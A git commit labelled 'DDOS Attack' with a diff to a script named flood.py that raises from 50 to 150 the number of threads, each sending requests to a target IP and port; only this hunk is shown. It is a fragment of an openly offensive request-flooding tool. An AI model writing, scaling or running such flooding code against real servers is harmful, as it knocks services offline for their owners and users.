9f9575973d59dc108ef23d5fe0a76f3589d6d211
Ubuntu <ubuntu@ip-172-31-44-135.ec2.internal>
2024-06-06 06:40:06 +0000

    DDOS Attack

--- flood.py
+++ flood.py
@@ -17,6 +17,6 @@ if __name__ == "__main__":
     url = f"http://{target_ip}:{target_port}"
 
     # Crea múltiples hilos para simular múltiples clientes
-    for i in range(50):  # Ajusta el número de hilos según sea necesario
+    for i in range(150):  # Ajusta el número de hilos según sea necesario
         thread = threading.Thread(target=send_request, args=(url,))
         thread.start()
